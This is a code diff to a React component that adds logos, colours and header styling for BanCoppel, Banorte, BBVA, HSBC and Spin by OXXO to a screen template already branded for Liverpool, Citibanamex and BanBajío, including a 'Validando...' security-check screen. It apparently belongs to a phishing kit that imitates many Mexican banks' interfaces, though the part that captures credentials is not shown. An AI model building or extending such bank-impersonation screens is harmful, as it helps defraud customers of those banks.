@@ -6,6 +6,11 @@ import { ScreenType } from '@shared/schema';
 import liverpoolLogo from '../../assets/pngwing.com 2.png';
 import citibanamexLogo from '../../assets/Banamex.png';
 import banbajioLogo from '../../assets/banbajio_logo_oficial.png';
+import bancoppelLogo from '../../assets/bancoppel.png';
+import banorteLogo from '../../assets/banorte_logo.png';
+import bbvaLogo from '../../assets/bbva_logo.png';
+import hsbcLogo from '../../assets/hsbc_logo.png';
+import spinLogo from '../../assets/spin_logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -332,7 +337,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-xl font-bold mb-4">Validando...</h2>
             <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
             <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
-              <div className={`h-full ${banco === 'BANBAJIO' ? 'banbajio-bg' : banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 'bg-[#e10098]'} animate-progress-bar`}></div>
+              <div className={`h-full ${
+                banco === 'BANBAJIO' ? 'banbajio-bg' : 
+                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
+                banco === 'BANCOPPEL' ? 'bancoppel-bg' :
+                banco === 'BANORTE' ? 'banorte-bg' :
+                banco === 'BBVA' ? 'bbva-bg' :
+                banco === 'HSBC' ? 'hsbc-bg' :
+                banco === 'SPIN' ? 'spin-bg' :
+                'bg-[#e10098]'
+              } animate-progress-bar`}></div>
             </div>
             <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
           </div>
@@ -355,6 +369,16 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANBAJIO':
         return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
+      case 'BANCOPPEL':
+        return 'bancoppel-button';
+      case 'BANORTE':
+        return 'banorte-button';
+      case 'BBVA':
+        return 'bbva-button';
+      case 'HSBC':
+        return 'hsbc-button';
+      case 'SPIN':
+        return 'spin-button';
       default:
         return 'bg-[#e10098] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Liverpool
     }
@@ -368,25 +392,59 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return <img src={citibanamexLogo} alt="Citibanamex" className="h-16 mx-auto mb-4" />;
       case 'BANBAJIO':
         return <img src={banbajioLogo} alt="BanBajío" className="h-16 mx-auto mb-4" />;
+      case 'BANCOPPEL':
+        return <img src={bancoppelLogo} alt="BanCoppel" className="h-16 mx-auto mb-4" />;
+      case 'BANORTE':
+        return <img src={banorteLogo} alt="Banorte" className="h-16 mx-auto mb-4" />;
+      case 'BBVA':
+        return <img src={bbvaLogo} alt="BBVA" className="h-16 mx-auto mb-4" />;
+      case 'HSBC':
+        return <img src={hsbcLogo} alt="HSBC" className="h-16 mx-auto mb-4" />;
+      case 'SPIN':
+        return <img src={spinLogo} alt="Spin by OXXO" className="h-16 mx-auto mb-4" />;
       default:
         return <img src={liverpoolLogo} alt="Liverpool" className="h-16 mx-auto mb-4" />;
     }
   };
 
+  // Función para obtener la clase de header según el banco
+  const getBankHeaderClass = () => {
+    switch(banco) {
+      case 'BANBAJIO': return 'banbajio-header';
+      case 'BANCOPPEL': return 'bancoppel-header';
+      case 'BANORTE': return 'banorte-header';
+      case 'BBVA': return 'bbva-header';
+      case 'HSBC': return 'hsbc-header';
+      case 'SPIN': return 'spin-header';
+      default: return 'bg-gray-100 p-3 text-center font-semibold';
+    }
+  };
+
+  // Función para obtener la clase del contenedor según el banco
+  const getBankContainerClass = () => {
+    switch(banco) {
+      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
+      case 'BANCOPPEL': return 'bancoppel-container';
+      case 'BANORTE': return 'banorte-container';
+      case 'BBVA': return 'bbva-container';
+      case 'HSBC': return 'hsbc-container';
+      case 'SPIN': return 'spin-container';
+      default: return '';
+    }
+  };
+
   return (
-    <div className={banco === 'BANBAJIO' ? 'bg-white p-4 rounded-lg shadow' : ''}>
-      {banco === 'BANBAJIO' && (
-        <div className="logo text-center mb-4">
-          {bankLogo()}
-          <div className="banbajio-header mb-4">
-            {new Date().toLocaleDateString('es-MX', {
-              day: 'numeric',
-              month: 'long',
-              year: 'numeric'
-            })}
-          </div>
+    <div className={getBankContainerClass()}>
+      <div className="logo text-center mb-4">
+        {bankLogo()}
+        <div className={`${getBankHeaderClass()} mb-4`}>
+          {new Date().toLocaleDateString('es-MX', {
+            day: 'numeric',
+            month: 'long',
+            year: 'numeric'
+          })}
         </div>
-      )}
+      </div>
       {renderScreen()}
     </div>
   );
